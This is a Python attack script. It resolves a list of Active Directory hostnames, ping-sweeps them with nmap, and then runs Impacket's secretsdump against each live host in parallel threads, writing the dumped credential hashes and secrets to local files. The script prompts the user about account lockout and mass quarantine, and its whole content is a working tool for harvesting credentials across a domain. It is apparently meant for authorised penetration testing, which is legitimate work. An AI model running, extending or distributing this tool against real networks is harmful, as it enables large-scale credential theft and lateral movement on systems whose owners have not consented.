import argparse
import os
import subprocess
import sys
import logging
import re
from tqdm import tqdm
import dns.resolver
import concurrent.futures
import shutil

# Setup logging to file, ensuring it appends each time the tool runs
logging.basicConfig(filename='dumper.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s', filemode='a')

def is_valid_hostname(hostname):
    return re.match(r'^[a-zA-Z0-9][a-zA-Z0-9\.-]{1,253}[a-zA-Z0-9]$', hostname) is not None

def resolve_hostnames(hosts, name_server):
    resolved_hosts = []
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [name_server]
    
    for host in hosts:
        try:
            answers = resolver.resolve(host, 'A')
            for rdata in answers:
                resolved_hosts.append(rdata.address)
                logging.debug(f"Resolved hostname: {host} -> {rdata.address}")
                break
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.Timeout) as e:
            logging.error(f"Failed to resolve hostname: {host} - {e}")
    
    return resolved_hosts

def check_live_hosts(hosts):
    live_hosts = []
    try:
        with open("temp_hosts.txt", "w") as temp_file:
            for host in hosts:
                temp_file.write(f"{host}\n")
        
        logging.debug(f"Hosts written to temp_hosts.txt: {hosts}")

        cmd = [
            "nmap", "-sn", "-iL", "temp_hosts.txt", "--min-hostgroup", "255",
            "--min-rtt-timeout", "0ms", "--max-rtt-timeout", "100ms", "--max-retries", "1",
            "--max-scan-delay", "0", "--min-rate", "2000"
        ]

        logging.debug(f"Running nmap command: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        logging.debug(f"Nmap command output: {result.stdout}")
        logging.debug(f"Nmap command error: {result.stderr}")

        if result.returncode == 0:
            output = result.stdout.splitlines()
            for line in output:
                if "Nmap scan report for" in line:
                    parts = line.split()
                    if len(parts) >= 5:
                        live_host = parts[4]
                        live_hosts.append(live_host)
        else:
            logging.error(f"Nmap scan failed: {result.stderr}")
    finally:
        if os.path.exists("temp_hosts.txt"):
            os.remove("temp_hosts.txt")

    return live_hosts

def run_secretsdump(host, domain, username, password, output_dir):
    output_file = os.path.join(output_dir, f"{host}.secretsdump")
    secretsdump_cmd = shutil.which("secretsdump.py") or shutil.which("impacket-secretsdump")
    if not secretsdump_cmd:
        logging.error("[!] Neither secretsdump.py nor impacket-secretsdump is available in PATH.")
        return f"[!] Neither secretsdump.py nor impacket-secretsdump is available in PATH."
    
    cmd = [
        secretsdump_cmd,
        f"{domain}/{username}:{password}@{host}",
        "-outputfile", output_file
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    logging.debug(f"Command executed: {' '.join(cmd)}")
    logging.debug(f"Command output: {result.stdout}")
    logging.debug(f"Command error: {result.stderr}")
    error_message = None
    if "[-] RemoteOperations failed:" in result.stdout or "[-] RemoteOperations failed:" in result.stderr:
        error_output = result.stderr if "[-] RemoteOperations failed:" in result.stderr else result.stdout
        error_message = error_output.split("[-] RemoteOperations failed:")[1].strip()
    if error_message:
        logging.error(f"[!] Secretsdump against {host} failed: {error_message}")
        return f"[!] Secretsdump against {host} failed: {error_message}"
    elif result.returncode == 0:
        return f"[+] Secretsdump against {host} complete -> See output directory for results."
    else:
        return f"[!] Secretsdump against {host} failed: {result.stderr.strip()}"

def main():
    parser = argparse.ArgumentParser(description="Perform multithreaded Secretsdump against live hosts")
    parser.add_argument("-tf", "--target-file", required=True, help="File containing list of hostnames")
    parser.add_argument("-d", "--domain", required=True, help="Domain")
    parser.add_argument("-u", "--username", required=True, help="Username")
    parser.add_argument("-p", "--password", required=True, help="Password")
    parser.add_argument("-o", "--output", help="Output directory for secretsdump results [Default: <current-directory>/Secretsdump_Output]")
    parser.add_argument("-ns", "--nameserver", required=True, help="Specify a name server for DNS resolution")
    args = parser.parse_args()

    confirmation = input(f"[*] User, you are about to perform large amounts of authentication attempts with the user \"{args.username}\". Are you cool with the potential of locking out this account? (Y/N): ").strip().lower()
    if confirmation != 'y':
        print("[!] Operation aborted by the user.")
        sys.exit(0)

    confirmation = input(f"[*] ...more importantly --> have you tested Secretsdump against single hosts to make sure you're not about to spark up a mass quarantine of all domain hosts? (Y/N): ").strip().lower()
    if confirmation != 'y':
        print("[!] Better to double check just to make sure you don't make a boo-boo.")
        sys.exit(0)
        
    output_dir = args.output if args.output else os.path.join(os.getcwd(), "Secretsdump_Output")
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    if not os.access(output_dir, os.W_OK):
        print(f"[!] Error: The output directory {output_dir} is not writable.", file=sys.stderr)
        logging.error(f"[!] The output directory {output_dir} is not writable.")
        sys.exit(1)

    with open(args.target_file, 'r') as f:
        hosts = [line.strip() for line in f if line.strip()]

    if any('/' in host for host in hosts) or any(host.replace('.', '').isdigit() for host in hosts):
        print("[!] Error: Please provide a list of domain computers extracted from LDAP instead of IP addresses or CIDR ranges.", file=sys.stderr)
        logging.error("[!] Provided hosts file contains IP addresses or CIDR ranges. Please provide a list of domain computers extracted from LDAP.")
        sys.exit(1)

    invalid_hosts = [host for host in hosts if not is_valid_hostname(host)]
    if invalid_hosts:
        print(f"[!] Error: The following entries are not valid hostnames: {', '.join(invalid_hosts)}", file=sys.stderr)
        logging.error(f"[!] Invalid hostnames detected: {', '.join(invalid_hosts)}")
        sys.exit(1)

    print("[+] Resolving hostnames...")
    resolved_hosts = resolve_hostnames(hosts, args.nameserver)
    if not resolved_hosts:
        print("[!] Error: Hostname resolution failed!")
        logging.error("[!] Hostname resolution failed!")
        sys.exit(1)
    
    print("[+] Finding live hosts...")
    live_hosts = check_live_hosts(resolved_hosts)
    if not live_hosts:
        print("[!] Error: No live hosts detected!")
        logging.error("[!] No live hosts detected!")
        sys.exit(1)
    logging.info(f"[+] Live hosts detected: {', '.join(live_hosts)}")

    if live_hosts:
        with tqdm(total=len(live_hosts), desc="Performing secretsdump", unit="host") as pbar:
            with concurrent.futures.ThreadPoolExecutor() as executor:
                future_to_host = {executor.submit(run_secretsdump, host, args.domain, args.username, args.password, output_dir): host for host in live_hosts}
                for future in concurrent.futures.as_completed(future_to_host):
                    host = future_to_host[future]
                    try:
                        result = future.result()
                        if "failed" in result:
                            print(f"[!] Secretsdump against {host} failed: {result}", file=sys.stderr)
                            logging.info(result)
                        else:
                            print(result)
                            logging.info(result)
                    except Exception as exc:
                        error_msg = f"[!] Error dumping secrets for host {host}: {exc}"
                        print(error_msg, file=sys.stderr)
                        logging.error(error_msg)
                    pbar.update(1)
                executor.shutdown(wait=False)

if __name__ == "__main__":
    main()
